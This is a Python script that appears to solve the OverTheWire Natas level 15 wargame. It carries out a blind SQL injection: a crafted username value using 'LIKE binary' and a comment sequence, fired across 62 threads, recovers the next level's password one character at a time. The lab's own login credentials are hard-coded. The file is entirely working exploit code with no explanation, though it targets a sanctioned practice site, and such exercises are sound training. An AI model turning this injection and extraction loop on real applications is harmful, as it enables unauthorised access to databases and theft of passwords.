
import requests
from concurrent.futures import ThreadPoolExecutor

basic_user = "natas15"
basic_pass = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
url = "http://natas15.natas.labs.overthewire.org/index.php"

password = ""

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
def check_password(prefix, chars_to_check):
    for c in chars_to_check:
        password_attempt = prefix + c
        print(f'checking {password_attempt}')
        resp = requests.post(url, data={'username': f'natas16" and password LIKE binary "{password_attempt}%%" -- '}, auth=(basic_user, basic_pass))
        if "This user exists" in resp.text:
            print(f'password updated : {password_attempt}')
            return password_attempt
    return None

# Number of threads to use
num_threads = 62

# Calculate number of characters each worker should check
chars_per_worker = len(chars) // num_threads
# Create a ThreadPoolExecutor with the specified number of threads
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    while len(password) < 32:
        # Submit tasks to the executor
        futures = []
        for i in range(num_threads):
            start_index = i * chars_per_worker
            end_index = (i + 1) * chars_per_worker if i != num_threads - 1 else len(chars)
            chars_to_check = chars[start_index:end_index]
            future = executor.submit(check_password, password, chars_to_check)
            futures.append(future)
        
        # Wait for any of the futures to complete
        for future in futures:
            result = future.result()
            if result:
                password = result
                break
